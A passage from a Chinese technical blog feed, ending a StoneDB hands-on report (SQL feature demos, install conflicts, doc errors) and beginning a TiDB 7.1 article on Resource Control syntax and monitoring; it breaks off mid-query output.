<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE sbtest;</span><br><span class="line">USE sbtest;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1 (id <span class="type">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT, parent_id <span class="type">INT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>, LEVEL TINYINT(<span class="number">4</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>, <span class="keyword">PRIMARY</span> KEY (id)) ENGINE<span class="operator">=</span>TIANMU;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t1 <span class="keyword">VALUES</span> (<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),(<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
<p>然后执行 <code>update ignore</code> 语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">update</span> ignore t1 <span class="keyword">set</span> id <span class="operator">=</span> id <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">2</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="keyword">Rows</span> matched: <span class="number">2</span>  Changed: <span class="number">2</span>  Warnings: <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<img  alt="stonedb5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230705-c0d3db6f-6d79-4225-b6fb-338e9cb50a1c.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="2-支持-GROUP-CONCAT-聚合方法">2. 支持 <code>GROUP_CONCAT</code> 聚合方法</h3>
<p>测试表延用上例，具体演示如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> GROUP_CONCAT(t.id) <span class="keyword">from</span> t1 t;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> GROUP_CONCAT(t.id) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>,<span class="number">8</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="3-支持在-union-union-all-中使用-select-数字-或者-select-数字-from-dual">3. 支持在 <code>union, union all</code> 中使用 <code>select &lt;数字&gt;</code> 或者 <code>select &lt;数字&gt; from dual</code></h3>
<p>测试表延用上例，具体演示如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id <span class="keyword">from</span> t1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id <span class="keyword">from</span> t1 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> dual;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="遇到的问题与建议">遇到的问题与建议</h2>
<ol>
<li>
<p>github 上的 Release Assets 建议加上 md5/sha256 校验码</p>
</li>
<li>
<p>centos 7.9 上安装时遇到冲突，需要先移除冲突的包，再进行安装</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transaction check error:</span><br><span class="line">  file /usr/lib64/libsnappy.so.1 from install of stonedb_5.7-1.0.4-1.el7.x86_64 conflicts with file from package snappy-1.1.0-3.el7.x86_64</span><br><span class="line">  file /usr/lib64/libmarisa.so.0 from install of stonedb_5.7-1.0.4-1.el7.x86_64 conflicts with file from package marisa-0.2.4-4.el7.x86_64</span><br><span class="line">  file /usr/lib64/libzstd.so.1 from install of stonedb_5.7-1.0.4-1.el7.x86_64 conflicts with file from package libzstd-1.5.0-1.el7.x86_64</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>如果本机已安装mysql/mariadb 需要先移除冲突的包，再进行安装</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Installing : stonedb_5.7-1.0.4-1.el7.x86_64</span><br><span class="line">ln: failed to create symbolic link ‘/usr/bin/mysql’: File exists</span><br><span class="line">ln: failed to create symbolic link ‘/usr/bin/mysqldump’: File exists</span><br><span class="line">warning: %post(stonedb_5.7-1.0.4-1.el7.x86_64) scriptlet failed, exit status 1</span><br><span class="line">Non-fatal POSTIN scriptlet failure in rpm package stonedb_5.7-1.0.4-1.el7.x86_64</span><br><span class="line">  Verifying  : stonedb_5.7-1.0.4-1.el7.x86_64 </span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>
<p>最新安装包，这个路径下没有 sourceenv 文件，文档有待更新<br>
<a class="link"   href="https://stonedb.io/zh/docs/getting-started/quick-deployment/deploy-stonedb-with-rpm" >https://stonedb.io/zh/docs/getting-started/quick-deployment/deploy-stonedb-with-rpm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li>
<p>启动时报错，结果是端口冲突导致的</p>
</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@centos7 ~]$ /opt/stonedb57/install/mysql_server start</span><br><span class="line">Starting Stonedbbasedir::: /opt/stonedb57/install/</span><br><span class="line">bindir::: /opt/stonedb57/install//bin</span><br><span class="line">datadir::: /opt/stonedb57/install/data/</span><br><span class="line">mysqld_pid::: /opt/stonedb57/install/data/mysqld.pid</span><br><span class="line">2023-07-05T01:34:13.490822Z mysqld_safe Logging to &#x27;/opt/stonedb57/install/data/centos7.shawnyan.com.err&#x27;.</span><br><span class="line">2023-07-05T01:34:13.519549Z mysqld_safe Starting mysqld daemon with databases from /opt/stonedb57/install/data</span><br><span class="line">.............................2023-07-05T01:34:45.163734Z mysqld_safe mysqld from pid file /opt/stonedb57/install/data/mysqld.pid ended</span><br><span class="line">/opt/stonedb57/install/mysql_server: line 264: kill: (114313) - No such process</span><br><span class="line">[FAILED]</span><br></pre></td></tr></table></figure></div>
<p>日志里的内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-07-05T01:30:52.630770Z 0 [ERROR] Can&#x27;t start server: Bind on TCP/IP port: Address already in use</span><br><span class="line">2023-07-05T01:30:52.630850Z 0 [ERROR] Do you already have another mysqld server running on port: 3306 ?</span><br><span class="line">2023-07-05T01:30:52.630879Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure></div>
<ol start="6">
<li>文档中的日志路径不对</li>
</ol>
<p>文档链接为：<a class="link"   href="https://stonedb.io/zh/docs/getting-started/quick-deployment/deploy-stonedb-with-rpm#%E6%AD%A5%E9%AA%A4-3%E4%BF%AE%E6%94%B9-root-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%AF%86%E7%A0%81" >修改 root 的初始密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在最新版本中的路径为：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@centos7 ~]$ cat /opt/stonedb57/install/data/mysqld.log |grep password</span><br><span class="line">2023-07-05T01:29:07.594205Z 1 [Note] A temporary password is generated for root@localhost: KrsiqidHq6:k</span><br><span class="line">[mysql@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<p>到此，体验告一段落，总体来说整个过程还是很丝滑的，没有遇到稀奇古怪的问题，不错！<br>
🍬🍬🍬</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/655984" >https://www.modb.pro/db/655984 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>StoneDB</category>
      </categories>
      <tags>
        <tag>stonedb</tag>
        <tag>htap</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.1.0 LTS 特性解读 | 资源管控 (Resource Control) 应该知道的 6 件事</title>
    <url>/2023/tidb/tidb-7.1-resource-control/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/release-7.1.0" >TiDB 7.1.0 LTS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已经发布一个多月了，相信很多同学都已经抢先使用了起来，甚至都已然经过一些列验证推向了生产环境。面对 TiDB 7.1 若干重要特性，新 GA 的 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control" >资源管控 (Resource Control) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是必须要充分理解、测试的一个重量级特性。对于常年奋斗在一线 DBA 岗位的我来说，学术方面的精进已经力不从心，大部分的时间都在强化“术”的方面，所以 TiDB 每更（新）必追，每个新 GA 的特性都要熟悉，这样当生产环境 TiDB 升级到目标版本后，才不至于手忙脚乱，新建 TiDB 集群后才能对新特性驾轻就熟。相信本文会给读者朋友们带来一些实质性的收获。言归正传，本文将围绕“资源管控”主题，详细说说关于 “资源管控” 您应该知道的 6 件事。</p>
<h2 id="font-color-0080FF-1-从用户场景出发，看特性如何使用-font"><font color='#0080FF'>1. 从用户场景出发，看特性如何使用</font></h2>
<p>从 200+ 的国产数据库中脱颖而出，其有效、完备的文档当属“功不可没”。在 TiDB 7.1 的文档中是这样描述 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF" >使用场景 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的：</p>
<blockquote>
<p>资源管控特性的引入对 TiDB 具有里程碑的意义。它能够将一个分布式数据库集群划分成多个逻辑单元，即使个别单元对资源过度使用，也不会挤占其他单元所需的资源。利用该特性：</p>
<ul>
<li>你可以将多个来自不同系统的中小型应用合入一个 TiDB 集群中，个别应用的负载升高，不会影响其他业务的正常运行。而在系统负载较低的时候，繁忙的应用即使超过设定的读写配额，也仍然可以被分配到所需的系统资源，达到资源的最大化利用。</li>
<li>你可以选择将所有测试环境合入一个集群，或者将消耗较大的批量任务编入一个单独的资源组，在保证重要应用获得必要资源的同时，提升硬件利用率，降低运行成本。</li>
<li>当系统中存在多种业务负载时，可以将不同的负载分别放入各自的资源组。利用资源管控技术，确保交易类业务的响应时间不受数据分析或批量业务的影响。</li>
<li>当集群遇到突发的 SQL 性能问题，可以结合 SQL Binding 和资源组，临时限制某个 SQL 的资源消耗。</li>
</ul>
</blockquote>
<p>那么，从务实的 DBA 角度来看这段话，可能会是下面这个样子：</p>
<p>资源管控，这一新特性，将数据库中的用户、会话、SQL等日常行为的性能指标做了更加细致的量化处理。引入了 “Request Unit (RU)” 这一量化概念，目前包括了 CPU, IOPS, IO带宽 三个重要指标，未来还会增加内存、网络等指标。</p>
<ul>
<li>可以将若干 MySQL 数据库合并进一个 TiDB 集群，比如读写峰值常出现于日间的 OA 系统，读写峰值常出现于夜间的 Batch 系统，以及 24 小时运行但负载持续稳定的数据采集系统，这种“三合一”的方式，使得各系统“错峰出行”，借助资源管控的能力“按需分配”，以此达到降低综合成本的目标。</li>
</ul>
<img  alt="t1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1688490615118.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>
<p>在一个 TiDB 集群，为不同测试环境 (Env) 创建不同测试用户 (User)，然后依据测试所需资源规格创建不同资源组 (Resource Group)，并将用户与对应的资源组做绑定。如此做到了不同用户的资源隔离，由于是测试环境，可将资源组设置为 <strong>超限 (</strong><code>BURSTABLE</code><strong>)</strong>，或者理解为“超卖”，某个或某几个用户使用的资源超过了资源组规定的限制，依旧可以正常使用，而不影响测试，可以最大化利用硬件资源。不过，这里的测试应该理解为业务测试，而非标准的性能测试，不然需要更加严谨的考虑资源分配以及 <strong>超限 (</strong><code>BURSTABLE</code><strong>)</strong> 的使用。</p>
</li>
<li>
<p>类似于第一节中的描述，三个系统分别对应三个资源组，且 BURSTABLE 的设定为 NO，那么三个系统使用的资源将是隔离的，不受彼此影响。也就是说，在当前 TiDB 集群中，即使 TP、AP 业务同时运行，由于使用了资源控制特性，此时 TP 业务并不会受到 AP 业务的干扰。</p>
</li>
<li>
<p>业务是不断变化的，“Bad SQL” 问题随时可能发生，如果某条 SQL 占用资源 (RU) 过高，影响该用户的其他 SQL 性能。此时，可以新建一个资源组，并可以使用 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/sql-plan-management" >执行计划绑定(SQL Binding) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 功能，将该 SQL 语句绑定到新建的资源组上，以起到限制 SQL 资源消耗，甚至拒绝 SQL 执行的目的。测试 SQL 如下：</p>
</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> RESOURCE <span class="keyword">GROUP</span> rg1 RU_per_SEC<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">GLOBAL</span> BINDING <span class="keyword">FOR</span></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> t1 t <span class="keyword">JOIN</span> t1 t2 <span class="keyword">USING</span> (uid) </span><br><span class="line"><span class="keyword">USING</span></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="comment">/*+ resource_group(rg1) */</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> t1 t <span class="keyword">JOIN</span> t1 t2 <span class="keyword">USING</span> (uid);</span><br><span class="line"></span><br><span class="line">EXPLAIN ANALYZE FORMAT <span class="operator">=</span> <span class="string">&#x27;verbose&#x27;</span> <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> t t1 <span class="keyword">JOIN</span> t1 t2 <span class="keyword">USING</span> (uid);</span><br></pre></td></tr></table></figure></div>
<p>为了实现上述场景，TiDB 实现了若干 SQL 语法，接下来看看如何具体操作。</p>
<h2 id="font-color-0080FF-2-“资源控制”相关-SQL，用这些就够了-font"><font color='#0080FF'>2. “资源控制”相关 SQL，用这些就够了</font></h2>
<p>研究 TiDB 的人还有不知道 <a class="link"   href="https://asktug.com/" >AskTUG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的么？（← 不知道请戳链接）<br>
半年前，@社区小助手 整理了一篇极具实用价值的帖子 – <a class="link"   href="https://asktug.com/t/topic/999618" >【社区智慧合集】TiDB 相关 SQL 脚本大全 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ， 内含 38 条实用 SQL，是 TiDBer 们必收藏的帖子之一。</p>
<p>彼时“资源控制”功能尚未“问世”，所以帖子里并不包含该特性相关 SQL，下面我将“资源控制”相关的精华 SQL 贴出，以供参考。</p>
<h3 id="1-增删改查-–-资源组-Resource-Group">1) 增删改查 – 资源组 (Resource Group)</h3>
<ul>
<li>增：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建 `rg1` 资源组，限额是每秒 `500 RU`，优先级为 `HIGH`，允许这个资源组的超额 (`BURSTABLE`) 占用资源。</span></span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE <span class="keyword">GROUP</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> rg1 </span><br><span class="line">  RU_PER_SEC <span class="operator">=</span> <span class="number">100</span></span><br><span class="line">  PRIORITY <span class="operator">=</span> HIGH</span><br><span class="line">  BURSTABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `rg2` 资源组，限额是每秒 `500 RU`，其他选项为默认值。</span></span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE <span class="keyword">GROUP</span> rg2 RU_PER_SEC <span class="operator">=</span> <span class="number">200</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>删</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除资源组</span></span><br><span class="line"><span class="keyword">DROP</span> RESOURCE <span class="keyword">GROUP</span> rg2;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>改</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 修改资源组资源配置</span></span><br><span class="line"><span class="keyword">ALTER</span> RESOURCE <span class="keyword">GROUP</span> rg2 ru_per_sec <span class="operator">=</span> <span class="number">2000</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通过 I_S 表查看</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.RESOURCE_GROUPS;</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，创建、修改、删除资源组，需要拥有 <code>SUPER</code> 或者 <code>RESOURCE_GROUP_ADMIN</code> 权限，否则会遇到报错：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ERROR <span class="number">1227</span> (<span class="number">42000</span>): Access denied; you <span class="title function_">need</span> <span class="params">(at least one of)</span> the SUPER or RESOURCE_GROUP_ADMIN <span class="title function_">privilege</span><span class="params">(s)</span> <span class="keyword">for</span> this operation</span><br></pre></td></tr></table></figure></div>
<h3 id="2-绑定用户到-Resource-Group">2) 绑定用户到 Resource Group</h3>
<ul>
<li>将某个用户绑定到资源组</li>
</ul>
<p>将用户和资源组绑定很简单，其实就是修改用户的属性。如果是已创建的用户，可以用 <code>ALTER USER</code>，如果是新建用户，则可用 <code>CREATE USER</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- CREATE</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> u3 RESOURCE <span class="keyword">GROUP</span> rg3;</span><br><span class="line"><span class="comment">-- ALTER</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> u2 RESOURCE <span class="keyword">GROUP</span> rg2;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看某个用户绑定到资源组</li>
</ul>
<p>这里有两种方法和二个问题，两种方法是分别通过 <code>mysql</code> 库和 <code>INFORMATION_SCHEMA</code> 库进行查询。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">User</span>, JSON_EXTRACT(User_attributes, &quot;$.resource_group&quot;) <span class="keyword">AS</span> RG <span class="keyword">FROM</span> mysql.user ;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">User</span> <span class="operator">|</span> RG        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-----------+</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u1   <span class="operator">|</span> &quot;default&quot; <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u2   <span class="operator">|</span> &quot;rg2&quot;     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u3   <span class="operator">|</span> &quot;&quot;        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="问题一：Resource-Group-的-和-default-等同">问题一：Resource Group 的 `` 和 <code>default</code> 等同</h4>
<p>从上面的查询结果来看，除了普通用户 <code>u2</code> 绑定的资源组 <code>rg2</code> 之外，其余三个用户其实都使用的是默认资源组，即 <code>default</code>。只是这里出现了空 (``)，可能会造成稍许疑虑，经与官方同学确认，<strong>“空和 default 在行为上面是一样的”</strong>。交流帖子参见：<a class="link"   href="https://asktug.com/t/topic/1008372/6?u=shawnyan" >resource control，default resource group 文档勘误 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="问题二：通过-INFORMATION-SCHEMA-USER-ATTRIBUTES-暂无法查询用户绑定的资源组">问题二：通过 <code>INFORMATION_SCHEMA.USER_ATTRIBUTES</code> 暂无法查询用户绑定的资源组</h4>
<p>普通用户是无权通过 <code>mysql</code> 库查询哪些用户绑定了哪些资源组的，包括当前用户，但是每个用户都可以通过 I_S 库查询自己应该可以获取的信息。<br>
所以方法二，是指普通用户通过查询 I_S 库来获取相关信息，SQL 如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.USER_ATTRIBUTES;</span><br></pre></td></tr></table></figure></div>
<p>只是目前效果不如意，期待下个版本会得到改进。<br>
相关帖子参见：<a class="link"   href="https://asktug.com/t/topic/1008437" >resource control 相关，INFORMATION_SCHEMA.USER_ATTRIBUTES 表取值问题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="3-绑定会话到-Resource-Group">3) 绑定会话到 Resource Group</h3>
<p>前面提到了绑定用户到 RG，其实 TiDB 提供了更加灵活的方式，可以绑定会话 (Session) 到 RG，以及绑定 SQL 语句到 RG。</p>
<ul>
<li>将当前会话绑定到资源组</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> RESOURCE <span class="keyword">GROUP</span> rg1;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看当前会话所使用的资源组</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CURRENT_RESOURCE_GROUP();</span><br></pre></td></tr></table></figure></div>
<ul>
<li>重置当前会话绑定资源组</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> RESOURCE <span class="keyword">GROUP</span> `<span class="keyword">default</span>`;</span><br><span class="line"><span class="keyword">SET</span> RESOURCE <span class="keyword">GROUP</span> ``;</span><br></pre></td></tr></table></figure></div>
<p>注：两条 SQL 的功能等价，但建议使用第一条，原因参见【问题一】。</p>
<h3 id="4-绑定语句到-Resource-Group">4) 绑定语句到 Resource Group</h3>
<p>可以使用 Hint 来控制具体某条 SQL 语句占用的 RU 资源，举例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*+ RESOURCE_GROUP(rg1) */</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure></div>
<p>如何查看某条语句消耗的 RU 呢？可以通过实际执行计划来获取，举例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">EXPLAIN ANALYZE <span class="keyword">SELECT</span> <span class="comment">/*+ RESOURCE_GROUP(rg1) */</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure></div>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1688490634363.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="5-不可或缺的-PROCESSLIST">5) 不可或缺的 <code>PROCESSLIST</code></h3>
<p><code>INFORMATION_SCHEMA</code> 是 ANSI 标准中定义的一组只读视图，提供数据库中所有表、视图、列和过程的信息。多个关系型数据库中都有各自的实现，在 TiDB 的 <code>INFORMATION_SCHEMA.PROCESSLIST</code> 表中，增加了字段 <code>RESOURCE_GROUP  varchar(32)</code>，以此来显示当前活跃会话使用的是哪个资源组。</p>
<p>案例如下，分别开三个窗口，启动三个会话，分别使用默认资源组，会话级资源组，和语句级资源组：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mysql -h <span class="number">192.168</span><span class="number">.195</span><span class="number">.128</span> -P <span class="number">4000</span> -c -u u1 -e <span class="string">&#x27;select sleep(1000)&#x27;</span></span><br><span class="line">mysql -h <span class="number">192.168</span><span class="number">.195</span><span class="number">.128</span> -P <span class="number">4000</span> -c -u u2 -e <span class="string">&#x27;SET RESOURCE GROUP `rg1`; select sleep(1000)&#x27;</span></span><br><span class="line">mysql -h <span class="number">192.168</span><span class="number">.195</span><span class="number">.128</span> -P <span class="number">4000</span> -c -u u3 -e <span class="string">&#x27;SELECT /*+ RESOURCE_GROUP(rg1) */ * sleep(1000)&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>此时用 root 用户查看 <code>INFORMATION_SCHEMA.PROCESSLIST</code> 表：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">USER</span>, RESOURCE_GROUP, INFO <span class="keyword">from</span> INFORMATION_SCHEMA.PROCESSLIST <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">USER</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">USER</span> <span class="operator">|</span> RESOURCE_GROUP <span class="operator">|</span> INFO                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span> <span class="keyword">default</span>        <span class="operator">|</span> <span class="keyword">SELECT</span> <span class="keyword">USER</span>, RESOURCE_GROUP, INFO <span class="keyword">from</span> INFORMATION_SCHEMA.PROCESSLIST <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">USER</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u1   <span class="operator">|</span> <span class="keyword">default</span>        <span class="operator">|</span> <span class="keyword">select</span> sleep(<span class="number">1000</span>)                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u2   <span class="operator">|</span> rg1            <span class="operator">|</span> <span class="keyword">select</span> sleep(<span class="number">1000</span>)                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> u3   <span class="operator">|</span> rg1            <span class="operator">|</span> <span class="keyword">SELECT</span> <span class="comment">/*+ RESOURCE_GROUP(rg1) */</span> sleep(<span class="number">1000</span>)                                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------------+-------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> 